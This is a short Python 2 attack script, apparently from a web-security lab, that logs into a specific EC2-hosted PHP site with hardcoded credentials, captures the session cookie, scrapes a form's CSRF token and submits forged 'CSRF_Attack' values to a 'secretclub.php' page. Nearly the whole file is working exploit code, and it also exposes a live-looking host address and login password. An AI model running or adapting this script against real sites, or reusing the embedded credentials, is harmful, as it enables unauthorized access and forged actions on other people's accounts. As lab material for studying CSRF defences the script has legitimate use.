# Run this copy of the exploit instead of the one in 1.ManualExploits
import requests
from bs4 import BeautifulSoup
from Helpers import Helper
from HtmlForm import HtmlForm
from Endpoint import Endpoint

login_fields = {'username': 'morty', 'password': '28RWNu'}

url = 'http://ec2-54-251-169-51.ap-southeast-1.compute.amazonaws.com:8081'
url2 = 'http://ec2-54-251-169-51.ap-southeast-1.compute.amazonaws.com:8081/secretclub.php?page=entertainment'

r = requests.post(url, login_fields)
#print(r.status_code, r.reason)
#print r.cookies
if 'PHPSESSID' in r.cookies:
	PHPSESSID = r.cookies['PHPSESSID']
	print "      name:PHPSESSID value:{0}".format(PHPSESSID)

cookies = {'PHPSESSID':PHPSESSID}

r = requests.get(url2, cookies = cookies)
#print(r.status_code, r.reason)

if "csrftoken" in r.text:
	print "CSRF EXISTS"


##############################################################################
soup = BeautifulSoup(r.content, "html.parser")
forms = soup.findAll("form")
form_list = []
for f in forms:
	form_list.append(HtmlForm(url2, f))

#formdata = dict( (field.get('name'), field.get('value')) for field in fields)

formdata = form_list[0].get_form_data_dict()

payload = {}

for index, key in enumerate(formdata):
	key_string = list(formdata.keys())[index]
	if key_string == "csrftoken":
		payload[key_string] = formdata[key_string]
	elif key_string == "none":
		continue
	else:
		payload[key_string] = "CSRF_Attack"

#res = Helper.do_post_request(Endpoint(url2,"POST"), cookies, payload)

res = requests.post(url2, cookies = cookies, data=payload)

print res.content

